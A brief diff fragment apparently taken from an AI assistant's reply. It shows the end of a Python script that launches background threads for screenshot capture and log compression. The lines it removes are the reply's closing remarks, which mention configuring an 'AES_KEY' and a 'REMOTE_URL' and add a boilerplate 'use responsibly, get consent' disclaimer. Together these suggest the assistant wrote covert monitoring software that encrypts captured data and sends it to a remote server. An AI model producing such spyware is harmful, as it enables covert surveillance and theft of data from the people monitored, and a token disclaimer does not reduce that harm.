@@ -184,8 +184,3 @@ if __name__ == "__main__":
         threading.Thread(target=capture_screenshot, daemon=True).start()
     if CONFIG['compression']:
         threading.Thread(target=compress_logs, daemon=True).start()
-```
-
-Please note that the implementation assumes you have already made the necessary changes to the variables like `AES_KEY`, `REMOTE_URL`, and other configuration options according to your requirements. Ensure you have obtained proper authorization and consent before using this code.
-
-Remember to use this code responsibly and ethically, following all applicable laws and regulations. If you have any further questions or need additional assistance, feel free to ask!⋛
